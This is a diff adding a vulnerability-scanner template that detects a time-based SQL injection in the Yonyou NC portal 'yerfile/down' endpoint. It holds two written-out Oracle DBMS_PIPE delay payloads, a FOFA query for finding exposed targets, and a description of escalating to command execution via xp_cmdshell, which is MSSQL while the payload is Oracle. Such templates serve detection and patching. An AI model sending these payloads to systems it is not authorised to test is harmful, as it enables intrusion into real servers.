@@ -1,0 +1,37 @@
+id: yongyouNC-yerfile_down-sql-XVE-2024-34596
+
+info:
+  name: "用友 NC portal 接口 SQL 注入导致远程代码执行"
+  author: Unknown
+  severity: high
+  description: |-
+    fofa: app="用友-UFIDA-NC"
+      用友NC portal/pt/yerfile/down 接口存在SQL注入漏洞，攻击者可通过该漏洞结合数据库xp_cmdshell组件执行任意系统命令，实现对目标服务器的控制。经技术分析表明，该漏洞利用条件较为宽松，攻击者仅需构造特定SQL注入载荷即可达成远程代码执行，建议受影响系统立即部署修复措施。
+  reference:
+  - https://mp.weixin.qq.com/s/JkhaRMFyZw4y6oj1W4WGfQ?token=17877307&lang=zh_CN
+  tags: 用友
+
+http:
+- raw:
+  - |
+    POST /portal/pt/yerfile/down/bill?pageId=login HTTP/1.1
+    Host: {{Hostname}}
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36
+    Content-Type: application/x-www-form-urlencoded
+
+    id=1'+AND+4563=DBMS_PIPE.RECEIVE_MESSAGE(CHR(65),4)--
+
+  - |
+    POST /portal/pt/yerfile/down/bill?pageId=login HTTP/1.1
+    Host: {{Hostname}}
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36
+    Content-Type: application/x-www-form-urlencoded
+
+    id=1'+AND+4563=DBMS_PIPE.RECEIVE_MESSAGE(CHR(65),8)--
+
+  matchers:
+  - type: dsl
+    dsl:
+    - 'duration_1>=4 && duration_1<=5'
+    - 'duration_2>=8 && duration_2<=9'
+    condition: and
